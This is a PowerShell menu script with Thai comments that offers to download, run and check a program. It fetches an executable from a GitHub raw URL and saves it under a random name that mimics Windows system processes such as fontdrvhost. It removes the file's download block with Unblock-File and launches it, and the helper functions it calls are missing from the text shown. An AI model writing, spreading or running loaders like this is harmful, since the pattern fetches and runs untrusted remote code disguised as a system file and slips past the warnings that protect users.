# --- [ CONFIGURATION ] ---
# กำหนดชื่อไฟล์แบบสุ่มตามเดิม
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$fileName = "$p_rand$m_rand`_$r_rand.exe"

# กำหนดโฟลเดอร์สำหรับเก็บไฟล์ให้ปลอดภัยและเป็นสัดส่วน (ไม่เก็บใน System32)
$appDirectory = "C:\STACKX"
$destPath     = Join-Path $appDirectory $fileName
$exeUrl       = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"

# สร้างโฟลเดอร์ปลายทางเตรียมไว้หากยังไม่มีในระบบ
if (-not (Test-Path $appDirectory)) {
    New-Item -ItemType Directory -Path $appDirectory -Force | Out-Null
}

# --- [ MAIN MENU LOOP ] ---
while ($true) {
    Show-Header
    
    Write-Console "1. Download Program (หากยังไม่เคยโหลด)" "INFO"
    Write-Console "2. Run Program (รันโปรแกรมรอบเดียว)" "INFO"
    Write-Console "3. Check Status (ตรวจสอบโปรแกรม)" "INFO"
    Write-Console "0. Exit" "INFO"
    Write-Host ""
    
    Write-Console "Select Option: " "INPUT"
    $choice = $Host.UI.ReadLine()

    if ($choice -eq "1") {
        Clear-Host
        Show-Header
        
        # ตรวจสอบก่อนว่าในโฟลเดอร์มีไฟล์อยู่แล้วหรือยัง
        if (-not (Test-Path $destPath)) {
            Write-Host "  Downloading system files from server..." -ForegroundColor Cyan
            Write-Host ""
            try {
                Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
                Unblock-File -Path $destPath

                Write-Host ""
                Write-Console "Download complete!" "SUCCESS"
                Write-Console "The application is ready to run." "INFO"
            }
            catch {
                Write-Host ""
                Write-Console "Download failed!" "ERROR"
                Write-Console $_.Exception.Message "INFO"
            }
        } else {
            Write-Host "  Notice: Program is already downloaded." -ForegroundColor Yellow
            Write-Console "You can execute it directly using Option 2." "INFO"
        }
        
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Show-Header
        
        # ตรวจสอบว่าผู้ใช้ดาวน์โหลดไฟล์มาหรือยังก่อนสั่งรัน
        if (Test-Path $destPath) {
            Write-Host "  Launching program..." -ForegroundColor Green
            Write-Host ""
            try {
                # สั่งรันโปรแกรมขึ้นมาทำงานปกติแบบรอบเดียว ไม่ผูกกับ Event ใดๆ
                Start-Process -FilePath $destPath -WindowStyle Normal
                Write-Console "Program started successfully." "SUCCESS"
            }
            catch {
                Write-Console "Failed to start program!" "ERROR"
                Write-Console $_.Exception.Message "INFO"
            }
        } else {
            # แจ้งเตือนหากยังไม่ได้ดาวน์โหลดไฟล์
            Write-Host "  [!] Error: File not found." -ForegroundColor Red
            Write-Console "Please select Option 1 to download the program first." "ERROR"
        }
        
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "3") {
        Clear-Host
        Show-Header
        
        Write-Host "  [ STACKX ENVIRONMENT STATUS ]" -ForegroundColor Magenta
        Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
        
        if (Test-Path $destPath) {
            $fileInfo = Get-Item $destPath
            Write-Host "  [+] System Status : READY / DOWNLOADED" -ForegroundColor Green
            Write-Host "  [*] File Name     : $($fileInfo.Name)" -ForegroundColor White
            Write-Host "  [*] Target Path   : $($fileInfo.FullName)" -ForegroundColor White
            Write-Host "  [*] File Size     : $([math]::Round($fileInfo.Length / 1MB, 2)) MB" -ForegroundColor White
        } else {
            Write-Host "  [-] System Status : NOT INSTALLED / NO FILE" -ForegroundColor Red
            Write-Host "  [*] Notice        : Please run option 1 to fetch required files." -ForegroundColor White
        }
        Write-Host "  -------------------------------------------------------" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  Press any key to return to menu..." -ForegroundColor DarkGray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    elseif ($choice -eq "0") {
        Write-Host "Closing application..." -ForegroundColor Base
        exit
    }
}
